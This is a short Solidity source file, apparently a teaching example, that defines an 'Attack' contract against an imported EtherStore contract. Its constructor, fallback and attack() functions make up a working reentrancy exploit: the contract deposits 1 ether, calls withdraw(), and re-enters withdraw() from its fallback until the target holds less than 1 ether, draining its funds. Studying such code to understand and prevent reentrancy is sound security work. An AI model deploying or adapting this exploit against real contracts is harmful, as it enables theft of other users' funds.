pragma solidity ^0.8.10;
import './EtherStore.sol';

contract Attack {

//We will store the target contract to exploit in a state variable called
//etherStore. When we deploy this contract, we will pass in the address of
//EtherStore contract.

     EtherStore public etherStore;
     constructor(address _etherStoreAddress) {
         etherStore = EtherStore(_etherStoreAddress);
     }

//Fallback is called when EtherStore sends Ether to this contract.

     fallback() external payable {
         if (address(etherStore).balance >= 1 ether) {
             etherStore.withdraw();
         }
     }
     function attack() external payable {
         require(msg.value >= 1 ether);
         etherStore.deposit{value: 1 ether}();
         etherStore.withdraw();
     }

//Helper function to check the balance of this contract.

     function getBalance() public view returns (uint) {
         return address(this).balance;
     }
}